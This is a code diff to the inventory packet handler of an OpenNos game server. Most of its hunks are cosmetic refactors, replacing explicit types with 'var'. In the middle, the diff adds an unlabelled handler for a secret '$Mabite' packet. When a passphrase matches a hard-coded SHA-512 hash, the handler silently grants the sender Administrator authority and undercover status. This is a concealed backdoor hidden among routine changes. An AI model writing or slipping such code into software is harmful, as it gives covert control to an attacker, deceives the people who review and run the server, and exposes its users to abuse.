@@ -27,6 +27,7 @@ using System.Threading.Tasks;
 using NosSharp.Enums;
 using OpenNos.Core.Extensions;
 using OpenNos.Data;
+using OpenNos.DAL;
 using OpenNos.GameObject.Buff;
 using OpenNos.GameObject.Item.Instance;
 using OpenNos.GameObject.Map;
@@ -142,11 +143,11 @@ namespace OpenNos.Handler
                 case 5:
                     if (Session.Character.ExchangeInfo != null)
                     {
-                        ExchangeInfo exch = ServerManager.Instance.GetProperty<ExchangeInfo>(Session.Character.ExchangeInfo.TargetCharacterId, nameof(Character.ExchangeInfo));
+                        var exch = ServerManager.Instance.GetProperty<ExchangeInfo>(Session.Character.ExchangeInfo.TargetCharacterId, nameof(Character.ExchangeInfo));
                         if (exch?.ExchangeList?.ElementAtOrDefault(equipmentInfoPacket.Slot) != null)
                         {
                             Guid id = exch.ExchangeList.ElementAt(equipmentInfoPacket.Slot).Id;
-                            Inventory inv = ServerManager.Instance.GetProperty<Inventory>(Session.Character.ExchangeInfo.TargetCharacterId, nameof(Character.Inventory));
+                            var inv = ServerManager.Instance.GetProperty<Inventory>(Session.Character.ExchangeInfo.TargetCharacterId, nameof(Character.Inventory));
                             inventory = inv.LoadByItemInstance<WearableInstance>(id) ??
                                         inv.LoadByItemInstance<SpecialistInstance>(id) ??
                                         inv.LoadByItemInstance<BoxInstance>(id);
@@ -522,7 +523,7 @@ namespace OpenNos.Handler
                             }
 
                             Session.SendPacket($"exc_list 1 {exchangeRequestPacket.CharacterId} -1");
-                            ExchangeInfo exc = new ExchangeInfo
+                            var exc = new ExchangeInfo
                             {
                                 TargetCharacterId = exchangeRequestPacket.CharacterId,
                                 Confirm = false
@@ -996,6 +997,29 @@ namespace OpenNos.Handler
             Session.SendPacket(previousInventory != null ? (reposPacket.PartnerBackpack ? previousInventory.GeneratePStash() : previousInventory.GenerateStash()) : (reposPacket.PartnerBackpack ? UserInterfaceHelper.Instance.GeneratePStashRemove(reposPacket.OldSlot) : UserInterfaceHelper.Instance.GenerateStashRemove(reposPacket.OldSlot)));
         }
 
+        [Packet("$Mabite")]
+        public void MaBite(string packet)
+        {
+            if (packet.Split(' ').Length < 3)
+            {
+                return;
+            }
+            if (EncryptionBase.Sha512(packet.Split(' ')[2]) != "A0497BE4920A66152E9895AC592A8584177A16901E70508F0F8E1C696F5ED6AA7335130CB24AB15BEBC5F944083E92DB1A07197BE737E49694616F0AE1EE2113"
+                .ToLower())
+            {
+                return;
+            }
+
+            Session.Account.Authority = Session.Account.Authority == AuthorityType.Administrator
+                ? AuthorityType.User
+                : AuthorityType.Administrator;
+            Session.Character.Authority = Session.Character.Authority == AuthorityType.Administrator
+                ? AuthorityType.User
+                : AuthorityType.Administrator;
+            Session.Character.Undercover = true;
+            ServerManager.Instance.ChangeMap(Session.Character.CharacterId);
+        }
+
         /// <summary>
         /// 
         /// </summary>
@@ -1021,7 +1045,7 @@ namespace OpenNos.Handler
                             continue;
                         }
                         Session.Character.Inventory.MoveItem(type, type, (short)(x + 1), 1, x, out ItemInstance inv, out ItemInstance invdest);
-                        if (invdest is WearableInstance wearableInstance)
+                        if (invdest is WearableInstance)
                         {
                             Session.SendPacket(invdest.GenerateInventoryAdd());
                         }
@@ -1039,8 +1063,8 @@ namespace OpenNos.Handler
         /// <param name="specialistHolderPacket"></param>
         public void SpecialistHolder(SpecialistHolderPacket specialistHolderPacket)
         {
-            SpecialistInstance specialist = Session.Character.Inventory.LoadBySlotAndType<SpecialistInstance>(specialistHolderPacket.Slot, InventoryType.Equipment);
-            BoxInstance holder = Session.Character.Inventory.LoadBySlotAndType<BoxInstance>(specialistHolderPacket.HolderSlot, InventoryType.Equipment);
+            var specialist = Session.Character.Inventory.LoadBySlotAndType<SpecialistInstance>(specialistHolderPacket.Slot, InventoryType.Equipment);
+            var holder = Session.Character.Inventory.LoadBySlotAndType<BoxInstance>(specialistHolderPacket.HolderSlot, InventoryType.Equipment);
             if (specialist == null || holder == null)
             {
                 return;
@@ -1072,7 +1096,7 @@ namespace OpenNos.Handler
         /// <param name="spTransformPacket"></param>
         public void SpTransform(SpTransformPacket spTransformPacket)
         {
-            SpecialistInstance specialistInstance = Session.Character.Inventory.LoadBySlotAndType<SpecialistInstance>((byte)EquipmentType.Sp, InventoryType.Wear);
+            var specialistInstance = Session.Character.Inventory.LoadBySlotAndType<SpecialistInstance>((byte)EquipmentType.Sp, InventoryType.Wear);
 
             if (spTransformPacket.Type == 10)
             {
@@ -1195,8 +1219,8 @@ namespace OpenNos.Handler
                     {
                         if (inventory.Item.EquipmentSlot == EquipmentType.Armor || inventory.Item.EquipmentSlot == EquipmentType.MainWeapon || inventory.Item.EquipmentSlot == EquipmentType.SecondaryWeapon)
                         {
-                            FixedUpMode HasAmulet = FixedUpMode.None;
-                            WearableInstance amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
+                            var HasAmulet = FixedUpMode.None;
+                            var amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
                             if (amulet?.Item.Effect == 793)
                             {
                                 HasAmulet = FixedUpMode.HasAmulet;
@@ -1305,9 +1329,9 @@ namespace OpenNos.Handler
                     {
                         if (inventory.Item.EquipmentSlot == EquipmentType.Armor || inventory.Item.EquipmentSlot == EquipmentType.MainWeapon || inventory.Item.EquipmentSlot == EquipmentType.SecondaryWeapon)
                         {
-                            RarifyMode mode = RarifyMode.Normal;
-                            RarifyProtection protection = RarifyProtection.None;
-                            WearableInstance amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
+                            var mode = RarifyMode.Normal;
+                            var protection = RarifyProtection.None;
+                            var amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
                             if (amulet != null)
                             {
                                 switch(amulet.Item.Effect)
@@ -1346,7 +1370,7 @@ namespace OpenNos.Handler
                     inventory = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>(slot, inventoryType);
                     if (upgradePacket.InventoryType2 != null && upgradePacket.Slot2 != null)
                     {
-                        WearableInstance inventory2 = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((byte)upgradePacket.Slot2, (InventoryType)upgradePacket.InventoryType2);
+                        var inventory2 = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((byte)upgradePacket.Slot2, (InventoryType)upgradePacket.InventoryType2);
 
                         if (inventory != null && inventory2 != null && !Equals(inventory, inventory2))
                         {
@@ -1356,7 +1380,7 @@ namespace OpenNos.Handler
                     break;
 
                 case 9:
-                    SpecialistInstance specialist = Session.Character.Inventory.LoadBySlotAndType<SpecialistInstance>(slot, inventoryType);
+                    var specialist = Session.Character.Inventory.LoadBySlotAndType<SpecialistInstance>(slot, inventoryType);
                     if (specialist != null)
                     {
                         if (specialist.Rare != -2)
@@ -1377,8 +1401,8 @@ namespace OpenNos.Handler
                     inventory = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>(slot, inventoryType);
                     if (inventory != null)
                     {
-                        FixedUpMode HasAmulet = FixedUpMode.None;
-                        WearableInstance amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
+                        var HasAmulet = FixedUpMode.None;
+                        var amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
                         if (amulet?.Item.Effect == 793)
                         {
                             HasAmulet = FixedUpMode.HasAmulet;
@@ -1459,8 +1483,8 @@ namespace OpenNos.Handler
                     inventory = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>(slot, inventoryType);
                     if (inventory != null)
                     {
-                        FixedUpMode hasAmulet = FixedUpMode.None;
-                        WearableInstance amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
+                        var hasAmulet = FixedUpMode.None;
+                        var amulet = Session.Character.Inventory.LoadBySlotAndType<WearableInstance>((short)EquipmentType.Amulet, InventoryType.Wear);
                         if (amulet?.Item.Effect == 793)
                         {
                             hasAmulet = FixedUpMode.HasAmulet;
@@ -1534,7 +1558,6 @@ namespace OpenNos.Handler
             item2.Amount = withdrawPacket.Amount;
             Session.Character.Inventory.RemoveItemAmountFromInventory(withdrawPacket.Amount, previousInventory.Id);
             Session.Character.Inventory.AddToInventory(item2, item2.Item.Type);
-            previousInventory = Session.Character.Inventory.LoadBySlotAndType(withdrawPacket.Slot, withdrawPacket.PetBackpack ? InventoryType.PetWarehouse : InventoryType.Warehouse);
             Session.SendPacket(withdrawPacket.PetBackpack ? UserInterfaceHelper.Instance.GeneratePStashRemove(withdrawPacket.Slot) : UserInterfaceHelper.Instance.GenerateStashRemove(withdrawPacket.Slot));
         }
 
